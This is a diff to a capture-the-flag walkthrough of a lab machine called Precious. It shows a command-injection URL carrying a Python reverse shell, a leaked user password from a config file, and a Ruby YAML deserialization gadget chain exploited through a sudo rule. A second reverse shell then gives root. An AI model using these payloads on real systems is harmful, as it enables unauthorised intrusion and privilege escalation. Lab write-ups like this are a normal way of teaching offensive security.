@@ -80,4 +80,90 @@ Let's start listening to connections on port `1234` using `Netcat`:
 ```
 nc -lvnp 1234
 ```
-now we can execute a python reverse shell using the exploit entering the following URL `http://10.10.16.79:8000/?name=%20\`export RHOST="10.10.16.79";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'\`` and get access to the server.
+now we can execute a python reverse shell using the exploit entering the following URL `` http://10.10.16.79:8000/?name=%20`export RHOST="10.10.16.79";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'` `` and get access to the server.
+
+## User
+Getting the user flag is quite simple, we can see we're logged in as the user `ruby`, looging around the directory `home` we find out that the flag is inside the `henry` directory, but we don't have permission to read the file `user.txt`.
+Looking inside the our `ruby` directory using `ls -la` we can see a strange directory called `.bundle`, inside of which there is a file `config`, which contains a credential leak of the user `henry:Q3c1AqGHtoI0aXAYFH`.
+We can now switch user or log in using SSH and get the flag: `su henry`.
+
+## Root
+First thing we check what commands the user is allowed to execute using `sudo -l`:
+```
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
+We can see that we can execute the the file `update_dependencies.rb` with ruby as `root` without using a password.
+Let's check out that ruby file:
+```ruby
+# Compare installed dependencies with those specified in "dependencies.yml"
+require "yaml"
+require 'rubygems'
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts "Installed version differs from the one specified in file: " + local_name
+            else
+                puts "Installed version is equals to the one specified in file: " + local_name
+            end
+        end
+    end
+end
+```
+We can see that the `list_from_file` function loads the `dependencies.yml` file using the `YAML.load()` method.
+With a bit of research we can find that the `.load()` method is vulnerable to a [YAML Deserialization Attack](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/).
+We can use a special payload, writing our own `dependencies.yml` file and make the script execute our code with root privileges:
+Let's try the exploit writing our `dependencies.yml` file in the `/home/henry/` directory:
+```yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "whoami"
+         method_id: :resolve
+```
+and executing it using `sudo /usr/bin/ruby /opt/update_dependencies`.
+We can see on top of the error the `root` output, so the command is executed as root.
+Our file is executed instead of the original one because the path to the file passed in the method `File.read(dependencies.yml)` is relative, so depends on where the script is executed from, in our case the `/home/henry/` directory.
+
+We can use this vulnerability to get a privileged reverse python3 `/bin/bash` shell on a different port, so we want the script to execute this command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.79\",4999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'`
+So we listen on the port `4999` on our local machine:
+```
+nc -lvnp 4999
+```
+and execute the file on the server.
+Once we got the `/bin/bash` shell we can `cd /root` and get the flag in the `root.txt` file/
